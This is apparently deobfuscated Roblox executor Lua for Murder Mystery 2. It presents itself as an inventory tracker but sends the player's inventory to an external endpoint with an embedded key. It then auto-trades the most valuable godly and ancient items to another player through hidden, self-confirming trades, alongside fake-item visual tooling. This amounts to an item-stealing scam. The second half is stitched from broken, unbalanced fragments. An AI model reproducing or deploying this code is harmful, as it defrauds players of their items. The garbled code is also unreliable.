-- discord.gg/syncrypt

local t1 = {
	function()
		local t2 = {
			Endpoint = "https://glorious-lapwing-967.convex.site/tracker/ingest",
			ClientKey = "bcfm25zs5cJSU7JafyOgbkflK8TbYfclXZNhVy6MjSQ",
			HeartbeatSeconds = 25,
			RefreshInventory = false
		}

		if not string.match(t2.Endpoint, "^https://") or #t2.ClientKey < 32 then
			warn("[MM2 Tracker] Run setup.py first; use the generated client.luau.")

			return
		end

		local genv = type(getgenv) == "function" and getgenv() or _G
		local MM2PrivateTracker = genv.MM2PrivateTracker

		if type(MM2PrivateTracker) == "table" and MM2PrivateTracker.running then
			print("[MM2 Tracker] Already running; duplicate launch ignored.")

			return
		end

		local request_ = syn and syn.request or http and http.request or fluxus and fluxus.request or http_request or request

		if type(request_) ~= "function" then
			warn("[MM2 Tracker] Executor HTTP request function unavailable. Nothing sent.")

			return
		end

		local mM2PrivateTracker = {
			running = true,
			ready = false
		}

		genv.MM2PrivateTracker = mM2PrivateTracker
		mM2PrivateTracker.Stop = function()
			mM2PrivateTracker.running = false
			print("[MM2 Tracker] Stopped; no more telemetry.")
		end

		local function v7(p1, p2)
			local u8 = false
			local u9 = false
			local u10
			local thread = task.spawn(function()
				local ok, result = pcall(p1)

				u9 = ok
				u10 = result
				u8 = true
			end)
			local now = os.clock()

			while not u8 and os.clock() - now < p2 and mM2PrivateTracker.running do
				task.wait(0.1)
			end

			if u8 then
				return u9, u10
			end

			pcall(task.cancel, thread)

			return false, "timeout"
		end
		local function v15(p3, p4)
			if type(p3) ~= "table" or type(p3.Weapons) ~= "table" or type(p3.Weapons.Owned) ~= "table" then
				return nil, "Weapons.Owned is unavailable"
			end

			local t3 = {}

			for k, v in pairs(p3.Weapons.Owned) do
				local n1

				if type(k) == "number" then
					n1 = 1

					if type(v) ~= "string" then
						local v20

						if type(v) == "table" then
							local Name = v.Name or v.ItemName or v.Key or v.Id

							n1 = tonumber(v.Amount)

							if n1 then
								v = Name
							else
								n1 = 1
								v = Name
							end
						else
							v = v20
						end
					end
				else
					local v22

					n1 = 1

					if type(k) ~= "string" then
						v = v22
					elseif type(v) == "number" then
						n1 = v
						v = k
					else
						if type(v) ~= "table" then
							return nil, "Unsupported owned amount"
						end

						n1 = tonumber(v.Amount)

						if n1 then
							v = k
						else
							n1 = 1
							v = k
						end
					end
				end

				if v == nil then
					return nil, "Unsupported inventory entry"
				end

				local v23 = tostring(v)

				if n1 ~= n1 or n1 == math.huge or n1 < 0 or n1 ~= math.floor(n1) or n1 > 1000000 then
					return nil, "Invalid item count"
				end

				if n1 > 0 then
					local v24 = p4[v23]

					if type(v24) ~= "table" then
						v24 = {}
					end

					local v25 = t3[v23]

					if v25 then
						v25.amount += n1
					else
						local t4 = {
							key = v23,
							name = tostring(v24.ItemName or v24.Name or v23),
							amount = n1
						}
						local rarity = v24.Chroma == true and "Chroma"

						if not rarity then
							rarity = tostring(v24.Rarity or "Unknown")
						end

						t4.rarity = rarity
						t4.chroma = v24.Chroma == true
						t3[v23] = t4
					end
				end
			end

			local t5 = {}

			for _, v in pairs(t3) do
				if v.amount > 1000000 then
					return nil, "Too many duplicates"
				end

				table.insert(t5, v)
			end

			table.sort(t5, function(p5, p6)
				return p5.key < p6.key
			end)

			return t5
		end
		local function v31()
			if _G.MM2FakeProfile or _G.MM2FakeWearController or _G.MM2MenuInputController then
				return true
			end

			local ok, result = pcall(function()
				return game:GetService("CoreGui"):FindFirstChild("__MM2ControlMenu") ~= nil
			end)

			return ok and result
		end
		local function v34(p7)
			local ok, result = pcall(require, p7)

			if ok then
				return result
			end

			local getthreadidentity_ = getthreadidentity or getidentity
			local setthreadidentity_ = setthreadidentity or setidentity

			if type(getthreadidentity_) == "function" and type(setthreadidentity_) == "function" then
				local v39 = getthreadidentity_()

				if pcall(setthreadidentity_, 2) then
					ok, result = pcall(require, p7)
					pcall(setthreadidentity_, v39)
				end
			end

			if not ok then
				error("Profile module unavailable in this client")
			end

			return result
		end
		local function v40()
			local now = os.clock()

			while not game:IsLoaded() and mM2PrivateTracker.running do
				if os.clock() - now > 60 then
					error("Game load timeout")
				end

				task.wait(0.25)
			end

			if not mM2PrivateTracker.running then
				return
			end

			local Players = game:GetService("Players")
			local LocalPlayer = Players.LocalPlayer

			if not LocalPlayer then
				error("LocalPlayer unavailable")
			end

			if v31() then
				error("MINIMAND already active. Rejoin, run tracker FIRST, then MINIMAND.")
			end

			local ReplicatedStorage = game:GetService("ReplicatedStorage")
			local HttpService = game:GetService("HttpService")
			local Modules = ReplicatedStorage:WaitForChild("Modules", 30)
			local Database = ReplicatedStorage:WaitForChild("Database", 30)

			if not Modules or not Database then
				error("MM2 modules unavailable")
			end

			local ProfileData = Modules:WaitForChild("ProfileData", 30)
			local Sync = Database:WaitForChild("Sync", 30)

			if not ProfileData or not Sync then
				error("MM2 profile unavailable")
			end

			local v50 = v34(ProfileData)
			local v51 = v34(Sync)
			local Weapons = v51.Weapons or v51.Item

			if type(Weapons) ~= "table" or next(Weapons) == nil then
				error("Weapon catalog unavailable")
			end

			local v53, v54 = v15(v50, Weapons)
			local now2 = os.clock()

			while not v53 and os.clock() - now2 < 30 and mM2PrivateTracker.running do
				task.wait(0.5)
				v53, v54 = v15(v50, Weapons)
			end

			if not v53 then
				error("Snapshot unavailable: " .. tostring(v54))
			end

			if v31() then
				error("MINIMAND started during capture. Rejoin and run tracker first.")
			end

			local now3 = os.time()
			local v57 = HttpService:GenerateGUID(false)
			local v58 = t2.RefreshInventory and "live_local" or "start_snapshot"
			local v59 = not t2.RefreshInventory

			mM2PrivateTracker.ready = true
			print("[MM2 Tracker] Snapshot ready for " .. LocalPlayer.Name .. ". Sending own-account telemetry to configured receiver.")
			print("[MM2 Tracker] Stop: getgenv().MM2PrivateTracker.Stop()")

			local n2 = 0

			while mM2PrivateTracker.running and LocalPlayer.Parent == Players do
				if not v59 then
					if v31() then
						print("[MM2 Tracker] MINIMAND detected. Inventory frozen; heartbeat continues.")
						v59 = true
						v58 = "frozen_before_minimand"
					else
						local v61 = v15(v50, Weapons)

						if v61 then
							now3 = os.time()
							v53 = v61
						else
							warn("[MM2 Tracker] Profile read failed; retaining last valid snapshot.")
						end
					end
				end

				n2 += 1

				local json = HttpService:JSONEncode({
					user_id = LocalPlayer.UserId,
					username = LocalPlayer.Name,
					session = v57,
					seq = n2,
					captured_at = now3,
					mode = v58,
					items = v53
				})
				local v63, v64 = v7(function()
					return request_({
						Url = t2.Endpoint,
						Method = "POST",
						Headers = {
							["Content-Type"] = "application/json",
							["X-Tracker-Key"] = t2.ClientKey
						},
						Body = json,
						Timeout = 12
					})
				end, 15)
				local v65 = v63 and type(v64) == "table"

				if v65 then
					v65 = tonumber(v64.StatusCode or v64.Status)
				end

				v65 = v65 or 0

				if v65 == 401 or v65 == 403 or v65 == 409 then
					error("Receiver rejected session/key (HTTP " .. tostring(v65) .. "). Check server configuration.")
				elseif v65 == 400 or v65 == 413 then
					error("Snapshot rejected (HTTP " .. tostring(v65) .. "). Profile format/size needs inspection.")
				elseif v65 ~= 200 then
					warn("[MM2 Tracker] Receiver unavailable; retrying. No secrets printed.")
				elseif n2 == 1 then
					print("[MM2 Tracker] First snapshot accepted by receiver.")
				end

				local v66 = os.clock() + t2.HeartbeatSeconds

				while mM2PrivateTracker.running and os.clock() < v66 do
					task.wait(0.5)
				end
			end
		end

		task.spawn(function()
			local ok, result = pcall(v40)

			mM2PrivateTracker.running = false

			if not ok then
				warn("[MM2 Tracker] Stopped: " .. tostring(result))
			end
		end)
	end,

				["373"] = {
					name = "Prince",
					rarity = "Vintage"
				},
				["370"] = {
					name = "Golden",
					rarity = "Vintage"
				},
				["378"] = {
					name = "Cowboy",
					rarity = "Vintage"
				},
				["377"] = {
					name = "Splitter",
					rarity = "Vintage"
				}
			}
		}
		local t8

		t8 = {
			VERSION = "MM2 snapshot sender 2.4 sequential",
			DEFAULTS = {
				TriggerDelay = 10,
				RequestInterval = 1,
				RequestErrorBackoff = 2,
				RequestMaxBackoff = 15,
				CancelRetryDelay = 2,
				SequentialTrades = true,
				PollInterval = 0,
				BusyPoll = 0.1,
				DataRetryInterval = 3,
				PriceRetryInterval = 30,
				InventoryPrefetchLead = 3,
				InventoryCacheMaxAge = 4,
				OfferInterval = 0,
				OfferAckWait = 10,
				MinimumOfferWait = 6.5,
				ConfirmGap = 0.8,
				CompleteWait = 180,
				TerminalCloseWait = 8,
				TerminalQuiet = 0.35,
				ReconcileTimeout = 45,
				ReconcileMinReads = 3,
				ReconcileInterval = 0.25,
				CancelStableReads = 3,
				PostConfirmCancelGrace = 10,
				BatchSlots = 4,
				MaxSnapshotAgeSeconds = 2592000,
				RefreshValuesSeconds = 3600,
				AllowedRarities = {
					godly = true,
					ancient = true,
					unique = true,
					classic = true,
					vintage = true
				},
				Keep = {
					DefaultKnife = true,
					DefaultGun = true
				},
				HideAutomaticTrade = true
			},
			TRADE_ENDED = {},
			OFFER_INTERRUPTED = {},
			copyMap = function(p8)
				local t9 = {}

				for k, v in pairs(p8) do
					t9[k] = v
				end

				return t9
			end,
			sameMap = function(p9, p10)
				for k, v in pairs(p9) do
					if v ~= (p10[k] or 0) then
						return false
					end
				end

				for k, v in pairs(p10) do
					if v ~= (p9[k] or 0) then
						return false
					end
				end

				return true
			end,
			snapshotPlanCounts = function(p11, p12)
				local t10 = {}

				for k, v in pairs(p11) do
					if v > 0 then
						assert((p12[k] or 0) >= v, "Snapshot items are missing from current inventory: " .. k)
						t10[k] = v
					end
				end

				return t10
			end,
			recordSnapshotTransfer = function(p13, p14)
				for k, v in pairs(p14) do
					local assert_ = assert
					local v85 = v > 0

					if v85 then
						v85 = v <= (p13[k] or 0)
					end

					assert_(v85, "Transfer exceeds startup snapshot")
				end

				for k, v in pairs(p14) do
					p13[k] -= v
				end
			end,
			strictInventory = function(p15)
				local Owned = type(p15) == "table" and type(p15.Weapons) == "table" and p15.Weapons.Owned

				assert(type(Owned) == "table", "DATA: GetFullInventory has no Weapons.Owned")

				local t11 = {}

				for k, v in pairs(Owned) do
					local v92

					if type(k) == "string" then
						if type(v) == "number" then
							v92 = v
						else
							v92 = nil

							if type(v) == "table" then
								v92 = tonumber(v.Amount or v.Count)
							end
						end
					elseif type(v) == "string" then
						v92 = 1
						k = v
					else
						k = nil
						v92 = nil

						if type(v) == "table" then
							k = v.Key or v.Id or v.Name or v.ItemName
							v92 = tonumber(v.Amount or v.Count)
						end
					end

					assert(type(k) == "string" and #k > 0 and type(v92) == "number" and v92 == v92 and v92 >= 0 and v92 < 1e9 and v92 % 1 == 0, "DATA: Unknown inventory row; no guessed amounts")

					if v92 > 0 then
						t11[k] = (t11[k] or 0) + v92
					end
				end

				return t11
			end,
			normalize = function(p16)
				return (tostring(p16 or ""):lower():gsub("’", ""):gsub("['\"]", ""):gsub("[^%w]", ""))
			end,
			rarity = function(p17)
				local v93 = tostring(p17 or ""):lower()

				return v93 == "classic" and "vintage" or v93
			end,
			isChroma = function(p18, p19)
				local v94 = t8.normalize(p18)
				local v95 = tostring(p19.ItemName or p19.Name or "")

				return p19.Chroma == true or v94:find("chroma", 1, true) ~= nil or v95:lower():find("^chroma") ~= nil or v95:lower():find("^c%.") ~= nil
			end,
			allowedItem = function(p20, p21, p22)
				if p22.Keep[p20] or type(p21) ~= "table" then
					return false
				end

				if p21.ItemType ~= "Knife" and p21.ItemType ~= "Gun" then
					return false
				end

				if not p22.AllowedRarities[tostring(p21.Rarity or ""):lower()] then
					return false
				end

				if p21.Tradable == false or p21.Tradeable == false or p21.CanTrade == false then
					return false
				end

				if p21.Untradable == true or p21.NonTradable == true or p21.Locked == true then
					return false
				end

				if p21.Evo == true or p21.Evolution == true or p21.IsEvo == true then
					return false
				end

				if p21.Category == "Evo" or p21.Category == "Evolution" then
					return false
				end

				return true
			end,
			setValues = function(p23, p24)
				assert(type(p23) == "table" and #p23 >= 20, "PRICES: incomplete/empty value list")

				local valueIndex = {}
				local prices = {}
				local t12 = {}

				for _, v in ipairs(p23) do
					local assert_ = assert
					local v102 = type(v.name) == "string" and #v.name > 0 and type(v.rarity) == "string"

					if v102 then
						v102 = v.value == nil

						if not v102 then
							v102 = type(v.value) == "number" and v.value >= 0 and v.value < 1e9 and v.value == v.value
						end
					end

					assert_(v102, "PRICES: malformed value row")

					local v103 = t8.rarity(v.rarity) .. ":" .. t8.normalize(v.name)

					assert(not valueIndex[v103], "PRICES: duplicate rarity/name " .. v.name)

					if v.sourceId then
						assert(not t12[v.sourceId], "PRICES: duplicate source ID")
						t12[v.sourceId] = true
					end

					valueIndex[v103] = v
					prices[v103] = v.value
				end

				local v104 = t8
				local v105 = t8

				t8.valueIndex = valueIndex
				v104.valuesMetadata = p24
				v105.PRICES = prices
			end,
			price = function(p25, p26)
				local valueIndex = t8.valueIndex or {}
				local v107 = t8.isChroma(p25, p26)
				local t13 = {}
				local t14 = {}

				local function v110(p27)
					if type(p27) ~= "string" or p27 == "" then
						return
					end

					local v111 = p27:gsub("^[Cc]%.%s*", ""):gsub("^[Cc][Hh][Rr][Oo][Mm][Aa][%s_%-]*", ""):gsub("[%s_%-]*[Cc][Hh][Rr][Oo][Mm][Aa]$", "")

					if v107 then
						p27 = "Chroma " .. v111
					elseif t8.normalize(p27):find("chroma", 1, true) then
						return
					end

					local v112 = t8.normalize(p27)

					if not t14[v112] then
						t14[v112] = true
						t13[#t13 + 1] = v112
					end
				end

				if p25 == "Sorry" then
					v110("Corrupt")
				end

				local ItemName = p26.ItemName or p26.Name or p26.DisplayName

				if p26.ItemType == "Gun" and type(ItemName) == "string" then
					v110(ItemName .. " Gun")
				end

				v110(p25)

				if type(ItemName) == "string" then
					v110(ItemName .. " " .. p26.ItemType)

					if p26.ItemType == "Knife" then
						v110(ItemName:gsub("%s+[Kk]nife$", ""))
					end

					v110(ItemName)
				end

				v110(p26.DisplayName)

				for _, v in ipairs(t13) do
					local v116 = valueIndex[t8.rarity(p26.Rarity) .. ":" .. v]

					if v116 then
						local v117 = not v116.itemType or v116.itemType == p26.ItemType
						local v118 = v116.chroma == true or t8.normalize(v116.name):find("^chroma") ~= nil

						if v117 and v118 == v107 then
							return v116.value, v116.name
						end
					end
				end

				return nil, nil
			end,
			catalogCoverage = function(p28, p29)
				local t15 = {
					eligibleKeys = 0,
					pricedKeys = 0,
					unpriced = {},
					byRarity = {},
					excludedRarities = {}
				}

				for k, v in pairs(p28) do
					if type(k) == "string" and t8.allowedItem(k, v, p29) then
						t15.eligibleKeys += 1
						t15.byRarity[v.Rarity] = (t15.byRarity[v.Rarity] or 0) + 1

						if t8.price(k, v) == nil then
							t15.unpriced[#t15.unpriced + 1] = {
								key = k,
								name = v.ItemName,
								itemType = v.ItemType,
								chroma = t8.isChroma(k, v)
							}
						else
							t15.pricedKeys += 1
						end
					elseif type(v) == "table" and type(k) == "string" then
						local v122 = tostring(v.Rarity or "(missing)")

						t15.excludedRarities[v122] = (t15.excludedRarities[v122] or 0) + 1
					end
				end

				table.sort(t15.unpriced, function(p30, p31)
					return p30.key < p31.key
				end)

				return t15
			end,
			plan = function(p32, p33, p34)
				local t16 = {}
				local t17 = {}
				local t18 = {
					eligibleUnits = 0,
					eligibleKeys = 0,
					excludedUnits = 0,
					missing = t17,
					excludedByRarity = {}
				}

				for k, v in pairs(p32) do
					local v128 = p33[k]

					if t8.allowedItem(k, v128, p34) then
						local eligibleKeys = t18.eligibleKeys + 1

						t18.eligibleUnits += v
						t18.eligibleKeys = eligibleKeys

						local v130, v131 = t8.price(k, v128)

						if v130 == nil then
							t17[#t17 + 1] = {
								key = k,
								name = v128.ItemName or k,
								amount = v
							}
						end

						t16[#t16 + 1] = {
							key = k,
							name = v128.ItemName or k,
							amount = v,
							unitValue = v130 or -1,
							priceMatch = v131,
							unpriced = v130 == nil,
							chroma = t8.isChroma(k, v128)
						}
					else
						t18.excludedUnits += v

						local v132 = type(v128) == "table"

						if v132 then
							v132 = tostring(v128.Rarity or "(missing)")
						end

						local v133 = v132 or "(missing catalog)"

						t18.excludedByRarity[v133] = (t18.excludedByRarity[v133] or 0) + v

						if type(v128) ~= "table" then
							t18.unknownCatalogKeys = t18.unknownCatalogKeys or {}
							t18.unknownCatalogKeys[#t18.unknownCatalogKeys + 1] = k
						elseif not p34.AllowedRarities[v133:lower()] and v133:lower() ~= "legendary" and v133:lower() ~= "rare" and v133:lower() ~= "uncommon" and v133:lower() ~= "common" and (v128.ItemType == "Knife" or v128.ItemType == "Gun") then
							t18.unknownRarities = t18.unknownRarities or {}
							t18.unknownRarities[#t18.unknownRarities + 1] = {
								key = k,
								rarity = v133
							}
						end
					end
				end

				table.sort(t16, function(p35, p36)
					if p35.unitValue == p36.unitValue then
						return p35.key < p36.key
					end

					return p35.unitValue > p36.unitValue
				end)
				table.sort(t17, function(p37, p38)
					return p37.key < p38.key
				end)

				local t19 = {}

				for i = 1, math.min(p34.BatchSlots, #t16) do
					t19[i] = t16[i]
				end

				return t19, t18
			end,
			batchMap = function(p39)
				local t20 = {}

				assert(#p39 > 0 and #p39 <= 4, "Invalid number of slots")

				for _, v in ipairs(p39) do
					assert(type(v.key) == "string" and type(v.amount) == "number" and v.amount >= 1 and v.amount % 1 == 0 and v.amount < 1e9 and not t20[v.key], "Invalid full-stack batch")
					t20[v.key] = v.amount
				end

				return t20
			end,
			offerMap = function(p40)
				assert(type(p40) == "table", "Unknown trade offer")

				local t21 = {}
				local n3 = 0

				for _, v in pairs(p40) do
					n3 += 1
					assert(n3 <= 4 and type(v) == "table" and type(v[1]) == "string" and type(v[2]) == "number" and v[2] >= 1 and v[2] % 1 == 0 and v[2] < 1e9 and v[3] == "Weapons" and not t21[v[1]], "Unknown trade offer shape")
					t21[v[1]] = v[2]
				end

				return t21
			end,
			checkView = function(p41, p42, p43, p44)
				assert(p41, "No verified server trade state")
				assert(next(p41.otherOffer) == nil, "Recipient added items; auto transfer paused")

				for k, v in pairs(p41.ownOffer) do
					local assert_ = assert
					local v146 = v >= 1

					if v146 then
						v146 = v <= (p42[k] or 0)
					end

					assert_(v146, "Unexpected own item/quantity")
				end

				if p43 then
					assert(t8.sameMap(p41.ownOffer, p42), "Offer differs from planned stacks")
				end

				if not p44 then
					assert(not p41.locked and not p41.ownAccepted, "Trade locked/accepted before pilot confirmation")
				end
			end,
			delta = function(p45, p46)
				local t22 = {}
				local t23 = {}

				for k in pairs(p45) do
					t22[k] = true
				end

				for k in pairs(p46) do
					t22[k] = true
				end

				for k in pairs(t22) do
					local v152 = (p46[k] or 0) - (p45[k] or 0)

					if v152 ~= 0 then
						t23[k] = v152
					end
				end

				return t23
			end,
			reconcile = function(p47, p48, p49, p50, p51)
				local v153 = t8.delta(p47, p48)
				local v154 = t8.delta(p49, p50)
				local t24 = {}

				for k, v in pairs(p51) do
					t24[k] = -v
				end

				return t8.sameMap(v153, t24) and t8.sameMap(v154, p51), {
					senderDelta = v153,
					recipientDelta = v154,
					expected = p51
				}
			end,
			waitFor = function(p52, p53, p54, p55)
				local v158 = p52.now() + p54

				while true do
					p52.check()

					if p53() then
						break
					end

					assert(p52.now() < v158, p55)
					p52.sleep(p52.pollInterval or 0.03)
				end
			end,
			pause = function(p56, p57)
				if p57 <= 0 then
					p56.check()

					return
				end

				local v159 = p56.now() + p57

				t8.waitFor(p56, function()
					return p56.now() >= v159
				end, p57 + 1, "Wait interrupted")
			end,
			sameFence = function(p58, p59)
				return p58 and p58.lastOffer == p59.lastOffer and t8.sameMap(p58.ownOffer, p59.ownOffer) and t8.sameMap(p58.otherOffer, p59.otherOffer)
			end,
			checkActionOffer = function(p60, p61, p62)
				t8.checkView(p60, p61, false, false)

				if p62 and not t8.sameMap(p60.ownOffer, p61) then
					error(t8.OFFER_INTERRUPTED, 0)
				end
			end,
			prepareBatch = function(p63, p64, p65, p66, p67)
				local v160 = t8.batchMap(p64)
				local t25 = {}

				p63.state.expected = v160
				t8.checkView(p63.state.view, v160, false, false)
				assert(next(p63.state.view.ownOffer) == nil, "Automatic trade did not start empty")
				t8.waitFor(p63, function()
					return p63.ui().open
				end, 8, "Native trade did not initialize")
				p63.preflight()

				local function v162(p68)
					p63.check()
					t8.checkView(p63.state.view, v160, false, false)

					if not t8.sameMap(p63.state.view.ownOffer, t25) then
						error(t8.OFFER_INTERRUPTED, 0)
					end

					local v163 = p63.ui()

					assert(v163.open and not v163.confirm and not v163.yourAccepted, "Native offer state changed")
					t25[p68.key] = (t25[p68.key] or 0) + 1
					p63.phase("stacking", p68.name .. " " .. t25[p68.key] .. "/" .. p68.amount)
					p63.offer(p68.key)
					t8.waitFor(p63, function()
						t8.checkView(p63.state.view, v160, false, false)
						assert(p63.ui().open, "Trade closed during stack build")

						return t8.sameMap(p63.state.view.ownOffer, t25)
					end, p67.OfferAckWait, "Stack acknowledgement missing/server limit; no blind retry")
					t8.pause(p63, p67.OfferInterval)
				end

				for _, v in ipairs(p64) do
					v162(v)
				end

				for _, v in ipairs(p64) do
					for i = 2, v.amount do
						v162(v)
					end
				end

				t8.checkActionOffer(p63.state.view, v160, true)
				p63.state.batchFilledAt = assert(p63.state.lastOfferAt, "Last acknowledged offer time missing")

				if p63.trace then
					p63.trace("batch-filled", {
						slots = #p64,
						lastOfferAt = p63.state.batchFilledAt,
						acceptNotBefore = p63.state.batchFilledAt + p67.MinimumOfferWait
					})
				end

				p63.phase("checking", "Сверяю обе стороны перед Accept")

				local v169, v170 = p63.inventories()

				assert(t8.sameMap(v169, p65) and t8.sameMap(v170, p66), "Inventories changed while building offer")
				p63.phase("cooldown", "Партия заполнена: 6,5 секунды и штатная готовность Accept")

				local u171

				local function v172(p69, p70)
					if not p63.trace then
						return
					end

					local v173 = p63.now() - p63.state.lastOfferAt >= p67.MinimumOfferWait
					local v174 = p69 .. ":" .. tostring(p70.firstEnabled) .. ":" .. tostring(p70.confirm) .. ":" .. tostring(p70.confirmEnabled) .. ":" .. tostring(p70.cooldown) .. ":" .. tostring(p70.addItem) .. ":" .. tostring(p70.yourAccepted) .. ":" .. tostring(v173)

					if v174 == u171 then
						return
					end

					u171 = v174
					p63.trace("native-readiness", {
						stage = p69,
						firstEnabled = p70.firstEnabled,
						confirm = p70.confirm,
						confirmEnabled = p70.confirmEnabled,
						cooldown = p70.cooldown,
						addItem = p70.addItem,
						yourAccepted = p70.yourAccepted,
						secondsSinceOffer = p63.now() - p63.state.lastOfferAt
					})
				end

				t8.waitFor(p63, function()
					t8.checkActionOffer(p63.state.view, v160, true)

					local v175 = p63.ui()

					v172("cooldown", v175)
					assert(v175.open and not v175.confirm and not v175.yourAccepted, "Native acceptance state changed")

					return v175.firstEnabled and not v175.cooldown and not v175.addItem and p63.now() - p63.state.lastOfferAt >= p67.MinimumOfferWait
				end, 45, "Native Accept cooldown did not finish")

				local confirmFence = {
					lastOffer = p63.state.view.lastOffer,
					ownOffer = t8.copyMap(v160),
					otherOffer = {}
				}

				p63.phase("first-accept", "Штатный Accept")

				local state = p63.state
				local state2 = p63.state
				local v179 = p63.now()

				state.firstAttempts = 1
				state2.firstAt = v179
				p63.clickFirst()
				t8.waitFor(p63, function()
					if not t8.sameFence(p63.state.view, confirmFence) then
						error(t8.OFFER_INTERRUPTED, 0)
					end

					return p63.ui().confirm
				end, 4, "Native Confirm did not open")
				t8.pause(p63, p67.ConfirmGap)
				p63.check()
				t8.checkActionOffer(p63.state.view, v160, true)

				if not t8.sameFence(p63.state.view, confirmFence) then
					error(t8.OFFER_INTERRUPTED, 0)
				end

				local v180 = p63.ui()

				v172("confirm", v180)
				assert(v180.open and v180.confirm and v180.confirmEnabled and not v180.cooldown and not v180.yourAccepted, "Native Confirm is not safe")
				p63.phase("confirm", "Confirm отправителя; жду получателя")
				p63.state.confirmFence = confirmFence
				p63.state.acceptAttempted = true
				p63.clickConfirm()
			end,
			settleBatch = function(p71, p72, p73, p74, p75)
				local v181 = t8.copyMap(p71)

				v181.check = assert(v181.checkSettling, "Settlement guard is required")

				local v182 = t8.batchMap(p72)

				v181.phase("settling", "Жду закрытия трейда и проверяю результат")
				t8.waitFor(v181, function()
					local open = v181.ui().open

					if not v181.state.ended and v181.state.acceptAttempted then
						t8.checkView(v181.state.view, v182, false, true)
					end

					if v181.state.interruptedAt and not v181.state.ended then
						assert(v181.now() - v181.state.interruptedAt < p75.TerminalCloseWait, "Offer changed without a verified trade ending; no replay")
					end

					if v181.state.ended and open and v181.state.endedAt then
						assert(v181.now() - v181.state.endedAt < p75.TerminalCloseWait, "Terminal event received but native trade stayed open; no replay")
					end

					return v181.state.ended and not open
				end, p75.CompleteWait, "Uncertain trade ending; inspect both accounts, no replay")

				if v181.onClosed then
					v181.onClosed()
				end

					end

					local v198 = not v181.state.acceptAttempted

		local function v419()
			if u279 and u279.owned then

		v284 = function()
			if v260.SequentialTrades then
				return
			end

					v311("next-request-not-needed", "No remaining eligible items after reported success; still verify inventories")

				end
			end

			local next_ = {

			local function v429()
				local v430 = mM2HighTierSender.enabled and u280 == v421 and v332(v421) and not v420.fault and not next_.fault

				if v430 then
					v430 = u279 == v420 and u283 == t43 or u279 == next_
				end

					task.wait(0)

						if mM2HighTierSender.enabled and not next_.owned and not next_.ended and not next_.fault and not v420.fault then
							if u279 == v420 and u283 == t43 or u279 == next_ then
								if not (u279 == next_ and next_.requestCount > 0) then

											next_.sendPending = true
											v433.requestArmed = true
											next_.requestCount += 1

											local ok, result = pcall(function()
												return v334(function()
													v429()
													assert(not v374().open, "Native trade reopened before empty request")
													next_.requestSentAt = os.clock()
													next_.requestRetryAt = next_.requestSentAt + v260.RequestInterval
													v311("SendRequest-immediate-empty", {
														to = v421.UserId,

												end, 12, v429, function()
													return next_.owned or next_.ended

											end)

											if v436 or result == false then
												next_.requestFailures = (next_.requestFailures or 0) + 1
												next_.requestRetryAt = math.max(next_.requestRetryAt, os.clock() + v260.RequestErrorBackoff)
											else
												next_.requestFailures = 0
											end

											v311("empty-request-response", {
												ok = ok,
												rejected = result == false,
												error = v436 and tostring(result) or nil
											})

											if u279 == next_ then
												n8 = next_.requestRetryAt
											end
										end

										end
									end
								end

						end

					end
				end)
				local v437 = next_

				next_.requestPumpActive = false
				v437.sendPending = false

				if not ok then
					next_.fault = "Empty request worker failed: " .. tostring(result)

					if u279 == v420 then
						v420.fault = next_.fault
					end

					v311("empty-request-worker-failed", next_.fault)
					v285()
				end

				end
			end)
		end

		local function v463(p116, p117)

		local function v481(...)
			local t45 = { ... }
			local t46 = {}
			local u484 = false

			local function v485(p118, p119)
				if typeof(p118) == "Instance" and p118:IsA("Player") then
					t46[p118.UserId] = p118
				elseif type(p118) == "string" then
					local v486 = Players:FindFirstChild(p118)

					if v486 and v486:IsA("Player") and v486.Name == p118 then
						t46[v486.UserId] = v486
					elseif p119 then
						u484 = true
					end
				elseif type(p118) == "number" and p119 then
					local playerByUserId = Players:GetPlayerByUserId(p118)

					if playerByUserId then
						t46[playerByUserId.UserId] = playerByUserId
					else
						u484 = true
					end
				elseif p119 then
					u484 = true
				end
			end

			for _, v in ipairs(t45) do
				if type(v) == "table" and typeof(v) ~= "Instance" then
					local v490 = false

					for _, v2 in ipairs({
						"Player",
						"Sender",
						"From",
						"Requester",
						"UserId",
						"Username"
					}) do
						if v[v2] ~= nil then
							v485(v[v2], true)
							v490 = true
						end
					end

					if not v490 then
						u484 = true
					end
				else
					v485(v, #t45 == 1)
				end
			end

			local v493
			local n12 = 0

			for _, v in pairs(t46) do
				n12 += 1
				v493 = v
			end

			if u484 or n12 ~= 1 or v493 == LocalPlayer then
				return nil
			end

			return v493
		end
		local function v497()
			v314(u277.StartTrade.OnClientEvent, function(p120)
				v463(p120, true)
			end)
			v314(u277.UpdateTrade.OnClientEvent, function(p121)
				v463(p121, false)
			end)
			v314(u277.AcceptTrade.OnClientEvent, function(p122)
				if not mM2HighTierSender.enabled or not u279 or u279.epoch ~= n9 or not u279.owned or not u279.acceptAttempted then

				})

			end)

			for _, v in ipairs({
				"DeclineTrade",
				"EndTrade",
				"CompleteTrade"
			}) do
				local v500 = Trade:FindFirstChild(v)

				if v500 and v500:IsA("RemoteEvent") then
					v314(v500.OnClientEvent, function()
						if u279 and u279.owned and u279.epoch == n9 and mM2HighTierSender.enabled then
							if u283 and u283.previous == u279 and u283.next and u283.next.owned then
								u279.fault = "Unattributed terminal during pending empty trade: " .. v

								local next_ = u283.next

								u283.next.fault = u279.fault
								next_.requestArmed = false

				for _, v in ipairs({ ... }) do

		local function v865(p188, p189)

		end

			local function createModel(p226, p227, p228)

				Model2:SetAttribute("MM2StaticChroma", v942(p227, p228))
				Model2:SetAttribute("MM2StaticComplete", p228.Complete == true)

			mM2VisualParser.TryCreateFromStaticMeshData = function(p250)
				if not p250 or p250 == "" then
					return nil

				local v1187 = mM2VisualParser.models[p250]

					return v1187.instance

					return nil

				if not v1188 or type(v1189) ~= "table" then
					print(("[mm2run/mesh-db] no matching 3D row for %s | %s"):format(tostring(p250), tostring(staticMeshState.status)))

					return nil
				end

				local ok, result = pcall(function()
					return createModel(p250, v1188, v1189)
				end)

				if not ok or not result then
					local warn_ = warn
					local s4 = "[mm2run/mesh-db] couldn't build %s from %s: %s"
					local format = s4.format
					local v1195 = tostring(p250)
					local v1196 = tostring(v1188)
					local tostring_ = tostring

					result = ok and "empty model" or result
					warn_(format(s4, v1195, v1196, tostring_(result)))

					return nil
				end

				local v1199 = Weapons[p250]

				pcall(function()
					v1198:SetAttribute("MM2WeaponKey", tostring(p250))
					v1198:SetAttribute("MM2MeshDataKey", tostring(v1188))

					if type(v1199) == "table" and v1199.ItemType then
						v1198:SetAttribute("ItemType", tostring(v1199.ItemType))
					elseif type(v1189.Meta) == "table" and v1189.Meta.ItemType then
